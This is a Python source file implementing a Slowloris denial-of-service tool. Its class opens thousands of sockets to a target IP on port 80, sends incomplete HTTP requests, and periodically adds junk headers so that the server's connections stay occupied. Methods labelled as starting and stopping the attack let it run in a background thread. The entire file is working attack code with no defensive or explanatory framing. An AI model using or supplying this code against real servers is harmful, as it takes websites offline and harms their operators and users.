import socket
import random
import threading
import time

class Slowloris:
    def __init__(self, target_ip, sockets=5000):
        self.target_ip = target_ip
        self.sockets = sockets
        self.running = False
        self.connections = []
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept-language: en-US,en,q=0.5",
            "Connection: keep-alive"
        ]

    def init_socket(self):
        """Initialize a socket connection"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        
        try:
            s.connect((self.target_ip, 80))
            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
            
            for header in self.headers:
                s.send(f"{header}\r\n".encode())
            
            return s
        except:
            return None

    def slowloris(self):
        """Maintain socket connections with partial headers"""
        while self.running:
            try:
                # Keep existing connections alive
                for i, s in enumerate(list(self.connections)):
                    try:
                        s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    except:
                        self.connections.remove(s)
                
                # Create new connections if needed
                while len(self.connections) < self.sockets and self.running:
                    s = self.init_socket()
                    if s:
                        self.connections.append(s)
                
                time.sleep(15)
            except:
                pass

    def start(self):
        """Start Slowloris attack"""
        self.running = True
        t = threading.Thread(target=self.slowloris)
        t.daemon = True
        t.start()

    def stop(self):
        """Stop Slowloris attack"""
        self.running = False
        for s in self.connections:
            try:
                s.close()
            except:
                pass
